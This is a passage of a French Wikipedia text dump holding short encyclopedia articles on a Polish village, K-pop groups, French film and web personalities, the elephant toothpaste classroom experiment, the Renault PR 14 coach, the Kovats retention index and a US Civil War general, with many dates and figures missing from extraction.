Malgré le « choc émotionnel » causé par la diffusion de la photographie du cadavre d'un enfant sur une plage, une majorité de Français se déclare le surlendemain défavorable à un assouplissement des règles d'octroi du statut de réfugié en faveur des Syriens pour cause de guerre.

</doc>
<doc id="9411838" url="https://fr.wikipedia.org/wiki?curid=9411838" title="Gryżyna (Grande-Pologne)">
Gryżyna (Grande-Pologne)

Gryżyna (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-est de Kościan (siège de la gmina et du powiat) et à au sud de Poznań (capitale régionale).
Le village possédait une population de en 2005.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Gryżyna est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9411840" url="https://fr.wikipedia.org/wiki?curid=9411840" title="Nine Muses">
Nine Muses

Nine Muses (coréen: 나인뮤지스, souvent stylisé 9MUSES ou NINE MUSES) est un girl group sud-coréen formé sous Star Empire Entertainment. Le groupe débute en 2010 avec le titre "No Playboy" venant de l'album single, "Let's Have a Party". Le nom du groupe provient des neuf muses de la mythologie grecque.
Fan-club.
Le , alors que le groupe a célébré son cinquième anniversaire de carrière, la Star Empire Entertainment a annoncé sur le compte Twitter officiel du groupe que l'un des événements liés à cette cinquième bougie serait la création, enfin, d'un fanclub officiel. Portant le nom de « MINE », pour « 9MUSES Is Never End ».
Un représentant de l'agence a confié : “Nous sommes en train de créer un fan club cinq ans après les débuts des Nine Muses. [...] Nous avons pris la décision de réaliser ce projet après avoir pris en compte l’avis des membres qui souhaitaient offrir un cadeau spécial aux fans coréens mais également aux fans internationaux aimant la musique des 9MUSES.”.
Histoire.
2010-2011 : Débuts, changement de membres et "Figaro".
La formation des Nine Muses et annoncé le . Elles font leur première sortie le avec le single album "Let's Have a Party". Le titre principal "No Playboy" est une chanson produite par les compositeurs Rainstone et Park Jin Young. En octobre, Jaekyung quitte le groupe pour se concentrer sur sa carrière de mannequin et fut remplacée par Hyuna. Pour avancer dans le marché japonais, le , les Nine Muses interprètent six chansons au "Seoul Train", un événement où des groupes et artistes K-pop performent pour leurs fans japonais, aux côtés de V.O.S. et ZE:A.
En janvier 2011, il est annoncé que les membres Bini, Rana et Euaerin vont quitter le groupe pour poursuivre d'autres activités, et que les membres ne seront pas remplacés. Cependant, trois mois après, Euaerin réintègre le groupe. En août, Nine Muses fait son retour avec le single "Figaro" en tant que groupe de sept membres, avec les débuts de Hyuna. Une fois que la période promotionnelle de "Figaro" ait commencée, la gestion pense à changer le nom du groupe pour Sweet Candy, pour ne pas porter confusion avec Nine Muses comme il ne reste que sept membres. Plusieurs mois après, leur agence confirme que le groupe ne changera pas de nom car deux membres s'y ajouteront et les filles seront donc de nouveau à 9. Le groupe publie "Figaro" et son clip vidéo le .
2012-2013 : "Sweet Rendezvous", débuts de Sungah et Kyungri.
Nine Muses introduit un nouveau membre, Kyungri, lors de leur performance à Abu Dhabi, EAU. Nine Muses sort le clip vidéo de "News" le avec le single du même nom qui est sorti un jours plus tard le . La chanson a été produite par Sweetune, qui a également produit "Figaro".
Le , le clip vidéo de "Ticket" du mini-album "Sweet Rendezvous" est mis en ligne. Le , les filles sortent deux clips vidéos pour la nouvelle chanson de la campagne militaire "My Youth's Allegiance". Le , Star Empire annonce qu'un nouveau membre, Sungah rejoindra le groupe.
Un single nommé "Dolls", est mis en ligne en janvier 2013. Il débute à la du "Gaon Top 100 Chart". Le , le clip vidéo de "Wild" est mis en ligne. Le titre débute à la du "Gaon Chart", alors que le mini-album du même nom débute à la le .
Le , Nine Muses sort son premier album studio, "Prima Donna", avec le titre-phare, "Gun". Un single digital, "Glue", est mis en ligne le accompagné de son clip vidéo.
2014–2015 : changement de membres, "Drama", "9Muses S/S Edition" et "Lost".
L'agence des filles, Star Empire, annonce le , que Lee Sem et Eunji vont quitter le groupe. Le , il est annoncé que Sera quittera aussi le groupe à la suite de l'expiration de son contrat.
Le , Kyungri, Kevin de ZE:A et une trainee (stagiaire) de Star Empire se sont associés pour former un projet unique nommé "Nasty Nasty" et sortent par la suite une chanson produite et composée par Rado.
Le , Star Empire annonce officiellement le retour du groupe avec leur troisième mini-album, "Drama" qui sortira le . Deux nouvelles membres sont alors révélées: Jo Sojin, membre du projet Nasty Nasty, et Lee Keumjo, une stagiaire (trainee). Nine Muses a tenu un showcase pour "Drama" le où les huit membres interprètent le titre-phare "Drama" pour la première fois. Le showcase a été diffusé en live sur YouTube.
Le , Nine Muses sort son quatrième mini-album, "9Muses S/S Edition" avec le titre-phare "Hurt Locker". L'album s'est d'ailleurs positionné à la du "Billboard's World Albums Chart". Le , le MV d'un autre titre de l'opus est mis en ligne, "Yes or No".
Le , le retour du groupe est annoncé via leur page Facebook officielle à la suite de la mise en ligne d'un cliché, accompagné d'un message révélant la date de leur retour, le . Différents teasers photos et vidéos ont par la suite étaient mis en ligne. Ainsi, le , les filles font leur comeback avec la mise en ligne du MV de "Sleepless Night" issu de leur cinquième mini-album, "Lost".
2016-2019 : Départs de Euaerin, Minha et Hyuna, premier sous-groupe et disband.
Le , Star Empire Entertainment a annoncé que Euaerin et Minha étaient "diplômées" du groupe c'est-à-dire qu'elles n'en feront plus partie désormais. Leur contrat est arrivé à terme et elles ont préféré ne pas le renouveler.
Le , l'agence des filles a déclaré que quatre membres allaient former la première sous-unité du groupe qui avait d’ailleurs déjà terminé d'enregistrer, et qui prévoyait de dévoiler son projet début août. Ainsi, le à minuit en Corée du Sud, le sous-groupe nommé Nine Muses A, constitué de Hyemi, Kyungri, Sojin et Keumjo, a mis en ligne le clip vidéo de "Lip 2 Lip" issu de l'album single "Muses Diary".
Le , Star Empire Entertainment a annoncé le départ de Hyuna du groupe, elle a d'ailleurs posté une lettre manuscrite sur le fancafé de Nine Muses pour annoncer sa décision aux fans.
Le signe la date du dernier clip de Nine Muses, "Remember", pour marquer leur séparation, ayant été annoncée par l'agence quelques jours plus tôt.
Le 24 février, Nine Muses auront le droit à un dernier fanmeeting.

</doc>
<doc id="9411842" url="https://fr.wikipedia.org/wiki?curid=9411842" title="Nachum Gutman">
Nachum Gutman



</doc>
<doc id="9411843" url="https://fr.wikipedia.org/wiki?curid=9411843" title="Vladimir Khintchegachvili">
Vladimir Khintchegachvili



</doc>
<doc id="9411848" url="https://fr.wikipedia.org/wiki?curid=9411848" title="Damien Manivel">
Damien Manivel

Damien Manivel est un réalisateur français né en 1981 à Brest.
Biographie.
D'abord danseur contemporain, Damien Manivel entre au Fresnoy (Studio national des arts contemporains, promotion Nam June Paik) en 2006, pour étudier le cinéma. Il signe plusieurs courts-métrages pour lesquels il reçoit notamment le prix Jean Vigo et le grand prix de la Semaine de la Critique de Cannes. "Un jeune poète", son premier long-métrage, est en compétition à Locarno où il obtient la mention spéciale du jury, "Le Parc" est sélectionné à Cannes (ACID) et remporte le Grand Prix aux Entrevues Belfort. Enfin, son troisième long-métrage tourné au Japon, "Takara", fait sa première en compétition Orizzonti à la Mostra de Venise 2017.
Il remporte le Léopard pour la meilleure réalisation au Festival international du film de Locarno 2019 pour "Les Enfants d'Isadora".

</doc>
<doc id="9411850" url="https://fr.wikipedia.org/wiki?curid=9411850" title="Baie de James">
Baie de James



</doc>
<doc id="9411855" url="https://fr.wikipedia.org/wiki?curid=9411855" title="Manettia">
Manettia

Manettia est un genre de plantes de la famille des "Rubiaceae". Il est dédié au botaniste italien Saverio Manetti.
Liste des espèces et variétés.
Selon :
Selon :
Selon :
Selon :
Selon (Attention liste brute contenant possiblement des synonymes) :

</doc>
<doc id="9411856" url="https://fr.wikipedia.org/wiki?curid=9411856" title="Dudswell">
Dudswell

Le terme Dudswell peut se référer à :

</doc>
<doc id="9411858" url="https://fr.wikipedia.org/wiki?curid=9411858" title="Dentifrice d'éléphant">
Dentifrice d'éléphant

Le « dentifrice d'éléphant » est une substance mousseuse créée par une rapide décomposition du peroxyde d'hydrogène. Il est utilisé pour des démonstrations en classe car il ne nécessite qu'un petit nombre d'ingrédients différents et permet de créer une sorte de « volcan de mousse ». Il est aussi appelé « expérience du marshmallow » (sans rapport avec le test du marshmallow de l'université Stanford).
Explication.
Description.
Le peroxyde d'hydrogène () concentré (à 30 %) est tout d'abord mélangé avec du savon liquide. Ensuite, un catalyseur, généralement de l'iodure de potassium (KI), est ajouté pour que le peroxyde d'hydrogène se décompose très rapidement. Ce dernier se décompose en eau et dioxygène. Comme une petite quantité de peroxyde d'hydrogène génère une grande quantité d'oxygène, l'oxygène se propulse rapidement en dehors du récipient. L'eau savonneuse capture l'oxygène, créant des bulles, et produit de la mousse. Des colorants alimentaires sont aussi souvent ajoutés avant le catalyseur.
Explication chimique.
Cette expérience montre la décomposition par catalyseur du peroxyde d'hydrogène. Ce dernier se décompose en eau et en oxygène (à l'état gazeux), mais habituellement, cette réaction est trop lente pour être perçue ou mesurée :
L'ion iodure de l'iodure de potassium agit comme un catalyseur : il accélère la réaction sans être consommé par le processus. L'ion iodure change le mécanisme de la réaction :
Il s'agit d'une réaction exothermique. La mousse produite est donc chaude.
Lien externe.
« Le jet de mousse », sur "scienceamusante.net"

</doc>
<doc id="9411861" url="https://fr.wikipedia.org/wiki?curid=9411861" title="Baie Thetys">
Baie Thetys

La baie Thetys ou baie Thetis (en ) est une baie située à la pointe sud-est de la partie argentine de la grande île de la Terre de Feu, dans la province de Terre de Feu, Antarctique et Îles de l’Atlantique Sud, au sud de l'Argentine. La baie s'ouvre sur la mer d'Argentine et au détroit de Le Maire, face à l'île des États.
Elle est délimitée par la cap Saint-Vincent (au nord) et par le cap San Diego (au sud). 

</doc>
<doc id="9411864" url="https://fr.wikipedia.org/wiki?curid=9411864" title="Willard Mitt Romney">
Willard Mitt Romney



</doc>
<doc id="9411866" url="https://fr.wikipedia.org/wiki?curid=9411866" title="Hugo Dessioux">
Hugo Dessioux

Hugo Dessioux, dit Hugo Tout Seul, né le à Paris, est un humoriste, vidéaste et acteur français. Il est principalement connu pour ses vidéos publiées sur Internet, qu'il diffuse via YouTube et/ou Dailymotion mais également sur son site, sa page Facebook et son compte Twitter. Il s'inscrit dans la lignée d'une nouvelle génération d'humoristes tels que Norman Thavaud, Cyprien Iov, Mister V ou encore Jérôme Niel, ayant acquis leur notoriété via des sites de partage vidéo et réseaux sociaux. En , il totalise plus de 2,21 millions d'abonnés et plus de 179 millions de vues sur son compte YouTube principal.
Il apparait également sur le petit écran aux côtés de Norman dans certains des épisodes de "Very Bad Blagues" diffusés sur Direct 8 aux côtés de Grégoire Ludig et David Marsais, par exemple dans "Les Résultats du bac". Hugo Dessioux fait également partie du Woop et fait des vidéos avec Norman Thavaud.
Biographie.
Enfance.
Né le , Hugo Dessioux fait ses études au lycée Saint-Sulpice dans le de Paris, en section littéraire. C'est là qu'il rencontre Norman Thavaud, lors d'une soirée de leur année de seconde. Interrogé sur son parcours post-bac, il répond qu'il ne savait pas particulièrement quoi faire et qu'il s'est lancé dans des études d'histoire pendant deux mois. Il ajoute qu'il s'est ensuite lancé dans la réalisation de courts métrages avec des amis étudiants en cinéma pendant un an et demi, en France et en Belgique. Pendant que Norman fait des études de cinéma, Hugo étudie les lettres modernes à la Sorbonne-Nouvelle. Il commence à tourner ses vidéos pendant cette époque.
Les débuts sur internet.
Il forme Le Velcrou avec Norman Thavaud en ; ils postent régulièrement des vidéos humoristiques sur Dailymotion. Des dires de l'un des créateurs, l'association est ainsi nommée car « on portait des chaussures à velcro et le crew, c'est pour la communauté ». Quatre mois après, Marc Jarousseau (alias "Kemar"), rejoint le Velcrou.
Il rencontre, grâce au Velcrou, Cyprien Iov, un autre video-blogger, qui apparaît par la suite dans quelques-unes de leur vidéos. En décembre, Cyprien crée et scénarise "Super Mega Noël", un court métrage humoristique sur le thème de Noël. Il y invite d'autres vidéastes dont Norman Thavaud.
En 2009, ses vidéos avec Le Velcrou commencent à lui rapporter de l'argent. Il est embauché, avec Norman Thavaud pour jouer dans une mini web-série produite par Digital Games : "« Nouvelle série Geek »" qui leur permet d'être rémunérés grâce à leurs vidéos. Cependant, comme le succès n'est pas particulièrement au rendez-vous, le groupe se sépare en . Cette période marque également le début de leurs carrières solo.
Carrière et notoriété.
Le apparait "Le Docteur du zizi", première vidéo de la carrière solo de Hugo Dessioux. À travers ses vidéos, il aborde des sujets du quotidien.
Le il est décrit par le journaliste de "Liberation" Éric Loret, tout comme Norman Thavaud et Cyprien Iov qui se sont lancés dans le même format comme .
Il fait partie de l'équipe de 10 minutes à perdre, avec qui il apparaît pour la première fois dans sa vidéo "Mon déménagement," avec Jérôme Niel en invité. Cette association est maintenant composée de Grandpamini, Baptiste et Hugo, ce dernier refusant de les rejoindre pour remplacer Omar et Fred au Grand Journal de Canal+.
Il est aussi possible de le voir sur le petit écran dans plusieurs épisodes de Very Bad Blagues du Palmashow sur Direct 8.
Dès 2013, il commence à poster moins de vidéos, .
Il poste également, sur son site officiel et sa chaîne YouTube, une playlist toutes les unes à deux semaines, comportant majoritairement du rap français et américain, avec les musiques du moment qu'il écoute.
En 2014, il fonde, avec six autres jeunes humoristes dont Mister V, le "Woop", un collectif d'humoristes postant leurs vidéos sur YouTube et se produisant aussi sur scène.
Hugo est par ailleurs coactionnaire de Talent Web SAS, la régie publicitaire de Mixicom, une société rachetée par Webedia en , procédure à l'issue de laquelle il aurait touché .

</doc>
<doc id="9411872" url="https://fr.wikipedia.org/wiki?curid=9411872" title="L'Enfant bleu (téléfilm)">
L'Enfant bleu (téléfilm)

L'enfant bleu est un téléfilm dramatique franco-suisse-canadien réalisé par Yvan Butler et diffusé en 1985.
Il reçoit le prix du meilleur scénario au festival de Digne en 1984.
Synopsis.
Une famille est installée dans une maison en bord de mer : Guillaume est un enfant souffrant de faiblesses cardiaques, Laurent est le père historien, ayant reçu confirmation de son éditeur pour un travail sur une rétrospective portant sur le débarquement de Normandie, et Jeannette la mère photographe, devant s’occuper des images mais repoussant son travail, inquiète pour son fils et des éventuelles séquelles. Cette situation complique ses rapports avec son mari.
Malgré plusieurs opérations correctrices dès l’âge de six ans, la greffe d’un cœur devient inévitable et doit être effectuée par un grand spécialiste à Montréal. Le but de l’opération est caché à l’enfant. L’attente d’un donneur met au jour les véritables rapports familiaux.
Réception.
Le téléfilm reçoit le prix du meilleur scénario au festival de Digne en 1984.

</doc>
<doc id="9411873" url="https://fr.wikipedia.org/wiki?curid=9411873" title="Melville Davisson Post">
Melville Davisson Post

Melville Davisson Post, né le à Romines Mills, dans le comté de Harrison, en Virginie-Occidentale, aux États-Unis, et mort à la suite d'une chute de cheval le à Clarksburg, en Virginie-Occidentale, est un écrivain et un nouvelliste américain, auteur de nouvelles de littérature policière.
Biographie.
Après avoir travaillé dans la ferme familiale, il fait des études de droit à l'université de Virginie-Occidentale.
En 1896, il publie son premier recueil de nouvelles, "The Strange Schemes of Randolph Mason", où son héros parvient à contourner la loi, ce qui aura pour conséquence de la faire modifier par les législateurs après la parution de l'ouvrage. 
En 1912, il fait paraître "The Nameless Thing" dans lequel il met en scène l'Oncle Abner, un fermier et éleveur en Virginie qui joue avec bonheur les détectives amateurs. Ses nouvelles se situent dans les années 1850 et sont racontées par Martin, le neveu du héros. 
, Post abandonne le droit et se consacre uniquement à l'écriture. Il crée alors d'autres personnages de détectives : Sir Henry Marquis, Monsieur Jonquelle, le Captain Walker et, surtout, le Colonel Braxton, un avocat détective de Virginie.
Liens externes.
 

</doc>
<doc id="9411877" url="https://fr.wikipedia.org/wiki?curid=9411877" title="3e cycle">
3e cycle



</doc>
<doc id="9411882" url="https://fr.wikipedia.org/wiki?curid=9411882" title="Château Vauban">
Château Vauban



</doc>
<doc id="9411885" url="https://fr.wikipedia.org/wiki?curid=9411885" title="Hippity Hop">
Hippity Hop

Hippity Hop est le premier mini-album du girl group sud-coréen EXID. Il est sorti le avec le titre principal, "I Feel Good", qui a été écrit et produit par Shinsadong Tiger.
Promotion.
Afin de promouvoir l'album, les EXID interprètent le titre-principal sur différents programmes de classement musicaux. Les promotions pour "I Feel Good" commencent le , au "Music Bank" de KBS.

</doc>
<doc id="9411890" url="https://fr.wikipedia.org/wiki?curid=9411890" title="Renault PR 14">
Renault PR 14

Le PR 14 est un autocar de ligne interurbaine et de tourisme fabriqué et commercialisé par les constructeurs français Berliet puis Renault Trucks de 1976 à 1989 .
Il sera lancé avec un moteur Renault ayant aucune norme européenne de pollution car non mit en place avant .
Le PR 14 remplace le Berliet Cruisair et sera remplacé par les Renault Tracer et FR1.
Historique.
Sous Berliet.
En 1975, les six premiers exemplaires de présérie du PR 14 sont testés. Les trois premiers n'ont pas la face arrière définitive, ce n'est qu'à partir du 4 que la face arrière est définitive avec le polyester et le pare-chocs enveloppant et la porte avant est à débattement extérieur, mais ce système trop peu fiable, sera remplacé par le système "Wegmann".
Le Berliet PR 14 est fabriqué entre 1976 et 1979 et succède au Cruisair 4, version à 57 places. La plupart sont vendus à des transporteurs français.&lt;br&gt;
En 1977, Berliet présente la version PR 14S avec le moteur 06.20.30, consommation 25/30 litres aux 100 km. C'est le seul autocar français à moteur turbocompressé mais la carrosserie n'est pas du gout des transporteurs qui font appel à de grands carrossiers : les italiens Padane, Menarini, Barbi, Bianchi, le basque Irizar et les belges Van Hool et Jonckheere. Fin 1977, Berliet présente une nouvelle carrosserie avec le collage des baies pour la version tourisme ce qui entraîne un gain de luminosité de 25 %.
Le succès du PR 14 éclipse le Cruisair 3 avec son moteur GM 6 V53, la mécanique prend place dans le Cruisair 3 pour donner le PR 12S, cette nouveauté se fait en même que le lancement du PR 14SR.
Après la reprise imposée par l'État de Berliet et sa fusion avec SAVIEM, la société Renault Véhicules Industriels - R.V.I. est constituée en octobre 1978. Mais dès le mois de mois de septembre 1979 le losange Renault remplace le monogramme Berliet sur la calandre des PR 14.
En 1978, le nombre croissant d'autocars de petite taille (10 mètres) et la sortie annoncée du Saviem E7 incité Berliet à présenter au plus vite le PR 10S, remplaçant du Cruisair 2, qui va rapidement être rebadgé Renault. La gendarmerie en a reçu 303 exemplaires entre septembre 1982 et juillet 1983, soit l'essentiel de sa production.
Sous R.V.I..
À partir de , la face avant des modèles livrés perd le monogramme Berliet. Le losange Renault est désormais apposé sur la calandre. Tout comme le modèle sous Berliet, la plupart des véhicules seront vendus à des transporteurs français. 
Lors du Salon de l'Automobile de Paris en octobre 1978, les clients font part de leurs remarques négatives au niveau de la carrosserie et de la mécanique qui n'est plus toute jeune. R.V.I. modifie la calandre en ajoutant un panneau noir avec les optiques de la Peugeot 604 et, bien sur, le losange Renault en son milieu. En 1980, la mécanique évolue avec le moteur MIDS 06.20.30 turbocompressé ce qui porte la puissance à 264 ch.
En octobre 1982, R.V.I. remplace le S57, autocar interurbain par le PR 14 SL. Il comporte une porte centrale, des vitrages non collés mais fixés par les traditionnels profilés en caoutchouc, le moteur MIDS de 264 ch. C'est la réponse du constructeur aux Setra S 215HR et Unic Lorraine 260L sorti en 1981. La fiabilité et la sobriété du PR 14SL ont été plébiscitées par les grands transporteurs.
La production des PR10 et PR12 est arrêtée en 1985, 500 Cruisair 2 et 500 PR10 ont été produits. Celle du PR14 s’arrête en 1989 qui est remplacé par les Renault Tracer et FR1.&lt;br&gt;
Générations.
Le PR 14 sera produit avec une seule génération de moteurs Diesel : 
Les différentes versions.
Il s'agit de la version raccourcie du PR 14. D'une longueur de , il est équipé de 10 rangées de sièges (d'où son nom), soit une capacité de 41 places assises. Il pouvait également être disponible avec 37 sièges, soit 9 rangées. De ce fait, les passagers pouvaient avoir plus de place. Sa base a été utilisée pour une version autocar de sécurité réalisée par le carrossier Heuliez.&lt;br&gt;. Environ 500 PR10 ont été produits.
Tout comme le PR 10 S, il s'agit de la version raccourcie du PR 14 faisant environ et une capacité de 49 places assises (12 rangées de sièges, d'où son nom).&lt;br&gt;
Version de base, les PR 14 ont une longueur d'environ et une capacité de 55 places assises (14 rangées de sièges, d'où son nom). Les PR 14 "S" (pour Suralimenté), seront équipés d'un moteur Berliet turbocompressé MIDR 06.20.30 de 8,82 litres peu après leur sortie. La puissance passera de 200 à . La version non équipée d'un turbo sera fabriquée pendant très peu de temps, uniquement sous la marque Berliet, car pas assez puissante. Il sera remplacé par le Renault Tracer.
"L" pour Ligne, cette version est utilisée sur les lignes interurbaines reliant, par exemple, plusieurs villes du même département. Tout comme la version de base, il a une capacité de 55 places assises. La porte de sortie des passagers, de type louvoyante extérieur, est située dans l'empattement. La porte avant sera équipée d'une custode afin que le conducteur puisse avoir une meilleure vue pour s’arrêter aux arrêts. Le vitrage sera jointé. Il peut être équipé en option de sièges inclinables, de rideaux, ainsi que, au-dessous des racks de rangements, des bouches de ventilations et éclairages pour chaque passager. Il est également muni de boutons "Arrêt demandé", de composteurs pour la validation de tickets et de girouette à films pour afficher la destination. Il sera remplacé par le Renault Tracer de ligne.&lt;br&gt;
"E" pour Economique, version lancée en 1982.&lt;br&gt;
"R" pour Région, cette version est principalement utilisée pour les lignes régionales, pour des courtes excursions ou en renfort de lignes interurbaines. Tout comme la version de ligne, il sera équipé de sièges inclinables, de rideaux, de bouches de ventilation et éclairages pour chaque passager. Il est également équipé d'un micro et d'une télévision. La porte de sortie des passagers de type battante est située en porte-à-faux arrière. Le vitrage sera collé avec custode de porte avant avec décrochement comme sur la version Berliet. Il sera remplacé par les Renault Tracer d'excursion et FR1.&lt;br&gt;
"GT" pour Grand Tourisme, cette version est la plus équipée et la plus confortable. Version surélevée réalisée par des carrossiers tels que Van Hool ou Gangloff, sur la base du châssis Renault. Il sera remplacé par le Renault FR1.&lt;br&gt;
Caractéristiques.
Parmi les sources des caractéristiques .
Chaîne cinématique.
Moteur.
Les PR 10, PR 12 et PR 14 ont eu plusieurs motorisations gazole au fil des années de leurs productions.&lt;br&gt;
Ils seront équipés d'une boite de vitesses manuelle à 11 rapports. "Plus d'infos : voir Boite de vitesses."
Boite de vitesses.
Les PR 10, PR 12 et PR 14 seront tous équipés d'une boite de vitesses manuelle à 6 rapports synchronisés (plus marche arrière) et complétée par un relais doubleur de gammes agissant sur les cinq rapports supérieurs. Ils auront donc onze rapports au total plus la marche arrière.

</doc>
<doc id="9411892" url="https://fr.wikipedia.org/wiki?curid=9411892" title="Musée de la photographie Ken Damy">
Musée de la photographie Ken Damy

Le Musée de la photographie Ken Damy (en italien, "Museo di fotografia Ken Damy") est un musée italien consacré à la photographie, situé sur le à Brescia, en Lombardie.
Historique.
Fondé par Ken Damy, pseudonyme du photographe professionnel Giuseppe Damiani, le musée a été inauguré le . Il est installé au rez-de-chaussée et au sous-sol de la "loggia delle mercanzie" (l'ancien palazzo Lechi), sur la gauche du cours en allant vers la .
Le , le musée se transforme en une association culturelle, qui se propose comme but la recherche et la promotion de la photographie contemporaine tant italienne qu'internationale à travers la programmation d'environ 40 expositions par an de photographes reconnus. Il a ainsi organisé des expositions photographiques d'auteurs d'importance mondiale, tels que Mario Giacomelli, Lucien Clergue, Gianni Berengo Gardin, Franco Fontana, Carmelo Bongiorno, Raghu Rai, , John Florea, , Jeff Dunas, Christian Vogt ou Victor Skrebnesky.
Le musée.
Le Musée de photographie Ken Damy dispose de huit salles d'exposition, d'un auditorium, d'une bibliothèque, et d'un petit bar, répartis sur une superficie totale de .
Outre la présentation d'expositions, le musée a également une activité pédagogique, en organisant des cours de photographie et une activité éditoriale, avec la publication de "Photonews", le magazine semestriel du musée et de catalogues en lien avec les expositions qu'il présente.
Le musée organise également des rencontres et des conférences avec des photographes italiens ou internationaux.

</doc>
<doc id="9411896" url="https://fr.wikipedia.org/wiki?curid=9411896" title="Indice de rétention de Kovats">
Indice de rétention de Kovats

En chromatographie en phase gazeuse, l'indice de rétention de Kovats (en abrégé indice de Kovats ou simplement indice de rétention) est utilisé pour convertir les temps de rétention en constantes indépendantes du système. L'indice porte le nom du chimiste suisse, hongrois de naissance, Ervin Kováts. Il décrivit pour la première fois ce concept dans les années 1950 lorsqu'il effectuait des recherches sur la composition des huiles essentielles.
L'indice de rétention d'un composé chimique est son temps de rétention normalisé par le temps de rétention de l'éluant des "n"-alcanes adjacents. Alors que le temps de rétention varie avec les différents systèmes de chromatographie (par exemple en ce qui concerne la longueur de la colonne, son diamètre, l'épaisseur du film, la vitesse du gaz porteur ou encore la pression), les indices de rétention calculés sont assez indépendants de ces paramètres et permettent de comparer des valeurs de mesures prises par différents laboratoires d'analyse sous différentes conditions. Les tables d'indices de rétention peuvent aider à identifier des composants en comparant les indices de rétention trouvés expérimentalement avec des valeurs connues.
Expression.
Cette méthode tire parti de la relation de linéarité entre les valeurs de formula_1 et le nombre d'atomes de carbone dans une molécule. La valeur de l'indice de Kovats est usuellement représenté par "formula_2" dans les expressions mathématiques. Son application est réduite aux composés organiques. Pour la chromatographie isotherme, l'indice de Kovats est donné par l'équation suivante :
avec :
Pour la chromatographie à température programmée, l'indice de Kovats est donné par l'équation :
avec :

</doc>
<doc id="9411900" url="https://fr.wikipedia.org/wiki?curid=9411900" title="Ed O.G.">
Ed O.G.



</doc>
<doc id="9411901" url="https://fr.wikipedia.org/wiki?curid=9411901" title="Supercoupe d'Europe masculine de handball 2007">
Supercoupe d'Europe masculine de handball 2007

La Supercoupe d'Europe masculine de handball 2007 est la de la compétition qui a eu lieu les 20 et dans la Zlatorog Arena de Celje en Slovénie.
Elle est remportée par le THW Kiel pour la première fois.
Équipes engagées et formule.
Les équipes engagées sont :
Le format de la compétition est une phase finale à 4 (demi-finale, finale et match pour la ) avec élimination directe.

</doc>
<doc id="9411902" url="https://fr.wikipedia.org/wiki?curid=9411902" title="Les Secrets de Pompéi">
Les Secrets de Pompéi



</doc>
<doc id="9411903" url="https://fr.wikipedia.org/wiki?curid=9411903" title="Made in America (film, 2013)">
Made in America (film, 2013)

 est un film de concert américain réalisé par Ron Howard, sorti en 2013.
Synopsis.
Le rappeur Jay-Z organise chaque année le à Philadelphie. Ce film montre des extraits des divers artistes qui s'y sont produits.

</doc>
<doc id="9411907" url="https://fr.wikipedia.org/wiki?curid=9411907" title="Melander">
Melander

Melander est un patronyme porté notamment par les personnalités suivantes :

</doc>
<doc id="9411913" url="https://fr.wikipedia.org/wiki?curid=9411913" title="Albion Paris Howe">
Albion Paris Howe

Albion Paris Howe (né le à Standish, État du Maine, et mort le à Cambridge, État de Massachusetts) est un major général de l'Union durant la guerre de Sécession.
Avant la guerre.
Albion Paris Howe sort diplômé de West Point en 1841.
Il est nommé second lieutenant le dans le "4th U.S. Artillery".
Il participe à la guerre américano-mexicaine. Il est promu premier lieutenant le . Il est breveté capitaine le pour bravoure et conduite méritoire lors des batailles de Contreras et Churubusco.
Il est promu capitaine le .
Guerre de Sécession.
Albion Paris Howe sert au début de la guerre en tant que commandant dans les "93rd Pennsylvania Infantry", "98th Pennsylvania Infantry" et "102nd Pennsylvania Infantry". Il est nommé brigadier général des volontaires le de la "2nd division" du "VI corps".
Le , il soutient par une attaque de flanc, la division du général John Newton qui mène des attaques frontales à "Marye's Heights", forçant les troupes de Jubal Anderson Early à abandonner ses positions. Il est breveté commandant le pour bravoure et service méritoire lors de la bataille de Malvern Hill. Il participe à la bataille de Fredericksburg.
Le général Régis de Trobriand écrit de Howe lors de la bataille d'Antietam : 
Il participe à la campagne de Chancellorsville. Il est breveté lieutenant colonel le pour bravoure et service méritoire lors de l'action à Salem Heights.
Il participe à la bataille de Gettysburg. Après la bataille, bien qu'il n'ait pas participé aux manœuvres du général Daniel Sickles à l'encontre du général George Meade, il témoigne contre ce dernier. Le , deux jours avant son audition devant le comité, le général Ulysses S. Grant, avec le général John Sedgwick, avait lui avait retiré son commandement et il prend celui du dépôt d'artillerie de Washington D.C.. Le général Meade avait participé à ce transfert. Il ne prend plus de commandement sur le champ de bataille jusqu'à la fin de la guerre. Il est promu commandant dans le "4th U.S. Artillery" le . Il participe à la campagne de Bristoe. Il est breveté colonel le pour bravoure et service méritoire lors de la seconde bataille de Rappahannock Station. Il participe à la campagne de Mine Run.
Le , il est breveté brigadier général et major général pour bravoure et service méritoire lors de la guerre et major général des volontaires pour loyauté et service méritoire.
Après la guerre.
Albion Paris Howe sert dans le bureau des esclaves affranchis ("Freedmen's Bureau"). Il quitte le service actif des volontaires le . Il est membre de la commission juge et reconnaît coupable Mary Surratt pour le complot d'assassinat d'Abraham Lincoln.
Il est promu lieutenant-colonel le . Il est promu colonel le dans le d'artillerie. Il part en retraite le .
Il meurt le à Cambridge et est enterré au cimetière de Mount Auburn.

</doc>
<doc id="9411918" url="https://fr.wikipedia.org/wiki?curid=9411918" title="Grotte bleue">
Grotte bleue

Grotte bleue est la traduction française du nom de plusieurs grottes :

</doc>
<doc id="9411924" url="https://fr.wikipedia.org/wiki?curid=9411924" title="Monts Hillary">
Monts Hillary

Les monts Hillary ("Hillary Montes") sont une chaîne de montagnes située sur la planète naine Pluton nommée d'après l'alpiniste Edmund Hillary et atteignant environ de hauteur.
Le nom de monts Hillary, proposé par l'équipe de "New Horizons" en , est officiellement approuvé par l'Union astronomique internationale le .

</doc>
<doc id="9411927" url="https://fr.wikipedia.org/wiki?curid=9411927" title="Games behind">
Games behind



</doc>
<doc id="9411932" url="https://fr.wikipedia.org/wiki?curid=9411932" title="Match de retard">
Match de retard



</doc>
<doc id="9411933" url="https://fr.wikipedia.org/wiki?curid=9411933" title="Match d'avance">
Match d'avance



</doc>
<doc id="9411935" url="https://fr.wikipedia.org/wiki?curid=9411935" title="Matchs d'avance">
Matchs d'avance



</doc>
<doc id="9411937" url="https://fr.wikipedia.org/wiki?curid=9411937" title="Matches d'avance">
Matches d'avance



</doc>
<doc id="9411938" url="https://fr.wikipedia.org/wiki?curid=9411938" title="Matches de retard">
Matches de retard



</doc>
